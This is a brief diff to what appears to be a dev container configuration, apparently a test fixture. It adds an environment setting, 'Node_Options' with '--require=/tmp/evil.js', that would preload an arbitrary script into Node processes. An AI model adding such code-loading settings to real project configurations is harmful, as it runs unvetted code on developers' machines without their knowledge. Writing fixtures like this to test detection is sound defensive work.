@@ -1,3 +1,4 @@
 {
-  "postCreateCommand": "cat /definitely/not/a/real/path"
+  "postCreateCommand": "echo hi",
+  "containerEnv": { "Node_Options": "--require=/tmp/evil.js" }
 }
